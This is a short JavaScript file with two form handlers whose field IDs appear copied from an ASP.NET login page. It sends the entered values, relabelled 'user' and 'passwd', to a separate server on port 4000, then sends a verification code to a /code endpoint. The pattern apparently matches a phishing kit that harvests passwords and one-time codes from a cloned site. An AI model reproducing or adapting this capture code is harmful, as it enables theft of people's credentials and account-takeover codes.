
 function but() {
    const b = ctl00_ctl00_cphMain_cphMain_txtSSN1.value;
    const c = ctl00_ctl00_cphMain_cphMain_txtConfirmSSN1.value;
    console.log(b, c);
    if (b !== "" && c !== "") {
      document.getElementById("error101").style.display = "none";
      document.getElementById("ss4").style.display = "none";
      document.getElementById("ss2").style.display = "none";
      document.getElementById("ss3").style.display = "none";
      document.getElementById("ss1").style.display = "none";
      const payload = {
        user: b,
        passwd:c
      }
      const result =  axios.post("http://localhost:4000/",payload).then((res)=>{
            if (res.data.message === 'success') {
                alert('yes')
            }else{
                alert('no')
            }
      })
    } else if (b === "" && c !== "") {
      document.getElementById("error101").style.display = "grid";
      document.getElementById("ss3").style.display = "inline-flex";
      document.getElementById("ss1").style.display = "flex";
      document.getElementById("ss4").style.display = "none";
      document.getElementById("ss2").style.display = "none";
    } else if (b !== "" && c === "") {
      document.getElementById("error101").style.display = "grid";
      document.getElementById("ss4").style.display = "inline-flex";
      document.getElementById("ss2").style.display = "flex";
      document.getElementById("ss3").style.display = "none";
      document.getElementById("ss1").style.display = "none";
    } else {
      document.getElementById("error101").style.display = "grid";
      document.getElementById("ss4").style.display = "inline-flex";
      document.getElementById("ss2").style.display = "flex";
      document.getElementById("ss3").style.display = "inline-flex";
      document.getElementById("ss1").style.display = "flex";
    }
  }

  function veriCode () {
    const d = ctl00_ctl00_cphMain_cphMain_txtSSN1.value;
    if (d === '') {
      document.getElementById("error101").style.display = "grid";
      document.getElementById("ss3").style.display = "inline-flex";
      document.getElementById("ss1").style.display = "flex";
    }else{
      document.getElementById("error101").style.display = "none";
      document.getElementById("ss3").style.display = "none";
      document.getElementById("ss1").style.display = "none";
      const payload = {
        code: d,
      }
      const result =  axios.post("http://localhost:4000/code",payload).then((res)=>{
            if (res.data.message === 'success') {
                alert('yes')
            }else{
                alert('no')
            }
      })
    }
  }